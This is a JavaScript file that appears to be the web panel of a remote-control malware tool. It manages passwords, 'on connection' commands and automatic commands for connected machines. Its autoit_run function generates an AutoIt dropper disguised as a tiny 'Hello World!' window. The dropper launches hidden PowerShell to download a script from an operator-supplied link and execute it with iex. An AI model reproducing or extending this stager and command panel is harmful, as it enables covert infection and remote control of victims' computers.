function open_change_password_form(){
    let form = document.getElementById('change_password_form');
    if(form.style.display == "block") form.style.display = "none";
    else form.style.display = 'block';
}

function change_password_send(){
    let old_password = document.getElementById('old_password').value;
    let new_password = document.getElementById('new_password').value;
    const xhttp = new XMLHttpRequest();

    xhttp.open("POST", "/profile", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhttp.send(`new_password=${new_password}&old_password=${old_password}`);

    xhttp.onload = function() {
        if(this.responseText == "done"){
            document.getElementById("change_password_status").style.display = ""
            document.getElementById("change_password_message").innerHTML = "The password has been changed"
             
        }
    }
}
function open_autoit(){
    let form = document.getElementById('open_autoit_div');
    if(form.style.display == "block") form.style.display = "none";
    else form.style.display = 'block';
}

function open_auto_command(){
    let form = document.getElementById('auto_command_div');
    if(form.style.display == "block") form.style.display = "none";
    else form.style.display = 'block';
}

function autoit_run(){
    let text = `#include <GUIConstantsEx.au3>
    #include <StaticConstants.au3>
    
    Opt("MouseCoordMode", 2)
    
    Local $child,$CLOSE
    $child = _GUICreate("Hello World!",1,1+1)
    
    Func _GUICreate($title,$width,$height,$left = Default,$top = Default)
        $child = GUICreate($title,$width,$height,$left,$top,0x80000000)
        $CmdPid = Run('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle Hidden -Command  "'&"(New-Object System.Net.WebClient).DownloadString('powershell_link') | iex"&'"',@DesktopDir, @SW_SHOW)
    
        _GuiCreateTitleBar("a",0)
    EndFunc
    
    
    
    Func _GuiCreateTitleBar($title,$width)
        GUICtrlCreateLabel($title, 3,3)
        GUICtrlSetColor(-1, 0xffffff)
        GUICtrlSetBkColor(-1, -2)
        $CLOSE = GUICtrlCreateLabel("X", $width - 15,3)
        GUICtrlSetColor(-1, 0xcc0000)
        GUICtrlSetBkColor(-1, -2)
    EndFunc   ;==>_GuiCreateButton
    
    GUISetState()
    
    
    `
    
    text = text.replace("powershell_link",document.getElementById("powershell_link").value)
    document.getElementById("textarea_form").innerHTML = text 
}
function open_on_connection_command(){
    let form = document.getElementById('open_on_connection_div');
    if(form.style.display == "block") form.style.display = "none";
    else form.style.display = 'block';
}

function open_on_connection_command_add(){
    let form = document.getElementById('open_on_connection_command_add_div');
    if(form.style.display == "block") form.style.display = "none";
    else form.style.display = 'block';
}

function on_connection_command_add_send(){


const xhttp = new XMLHttpRequest();

    xhttp.open("POST", "/apis/add_on_connection_command", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    const title = document.getElementById("on_connection_command_add_title").value
    const des = document.getElementById("on_connection_command_add_des").value
    const command = document.getElementById("on_connection_command_add_command").value

    xhttp.send(`title=${title}&des=${des}&command=${command}`);

    xhttp.onload = function() {
        if(this.responseText == "done"){
            document.getElementById("on_connection_command_status").style.display = ""
            document.getElementById("on_connection_command_message").innerHTML = "The command was successfully added"
             
        }
    }


}
function on_connection_command_delete_send(){


    const xhttp = new XMLHttpRequest();
    
        xhttp.open("POST", "/apis/delete_on_connection_command", true);
        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        const id = document.getElementById("on_connection_command_delete_id").value
    
        xhttp.send(`id=${id}`);
    
        xhttp.onload = function() {
            if(this.responseText == "done"){
                document.getElementById("on_connection_command_status").style.display = ""
                document.getElementById("on_connection_command_message").innerHTML = "The command was successfully deleted"
                 
            }
        }
    
    
    }
function open_on_connection_command_list(){
    let form = document.getElementById('open_on_connection_command_list_div');
    if(form.style.display == "block") form.style.display = "none";
    else form.style.display = 'block';
}
function open_on_connection_command_delete(){
    let form = document.getElementById('open_on_connection_command_delete_div');
    if(form.style.display == "block") form.style.display = "none";
    else form.style.display = 'block';
}
function open_auto_command_add_div(){
    let form = document.getElementById('auto_command_add_div');
    if(form.style.display == "block") form.style.display = "none";
    else form.style.display = 'block';

}
function open_auto_command_list_div(){
    let form = document.getElementById('auto_command_list_div');
    if(form.style.display == "block") form.style.display = "none";
    else form.style.display = 'block';

}
function open_auto_command_delete_div(){
    let form = document.getElementById('auto_command_delete_div');
    if(form.style.display == "block") form.style.display = "none";
    else form.style.display = 'block';

}
function auto_command_delete_send(){
    const xhttp = new XMLHttpRequest();
    let form = document.getElementById('auto_command_delete_title');
    const title = document.getElementById('auto_command_delete_title').value;
    xhttp.open("GET", `/apis/delete_auto_command?title=${title}`, true);
    xhttp.send()
    xhttp.onload = function() {
        if(this.responseText == "done"){
            document.getElementById("auto_command_status").style.display = ""
            document.getElementById("auto_command_message").innerHTML = "The command was deleted."
             
        }
    }
}

function auto_command_send(){

    let title = document.getElementById('auto_command_title').value;
    let des = document.getElementById('auto_command_des').value;
    let command = document.getElementById('auto_command_command').value;
    
    const xhttp = new XMLHttpRequest();

    xhttp.open("GET", `/apis/add_auto_command?title=${title}&des=${des}&command=${command}`, true);
    xhttp.send()
    xhttp.onload = function() {
        if(this.responseText == "done"){
            document.getElementById("auto_command_status").style.display = ""
            document.getElementById("auto_command_message").innerHTML = "The command was added."
             
        }
    }

}

